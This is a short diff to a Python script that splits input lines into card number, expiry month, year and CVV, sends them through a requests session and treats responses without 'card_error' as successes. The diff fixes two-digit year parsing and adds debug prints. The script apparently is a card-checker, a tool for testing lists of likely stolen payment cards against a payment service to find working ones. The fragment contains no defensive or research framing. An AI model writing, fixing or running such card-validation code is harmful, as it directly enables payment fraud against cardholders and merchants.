@@ -19,7 +19,11 @@ for i in range(len(filtered_lines) - 1):
 	z=c.split("|")
 	card=z[0]
 	mon=z[1]
-	year=z[2][2:]
+	print()
+	if len(z[2]) == 2:
+		year=z[2]
+	else:
+		year=z[2][2:]
 	print(card)
 	cvv=z[3]
 	s=requests.session()
@@ -45,6 +49,7 @@ for i in range(len(filtered_lines) - 1):
 	if "card_error" in res.text:
 		pass
 	else:
+		print(res.text)
 		response=res.json()['id']
 		print(response)
 		print("*"*50)
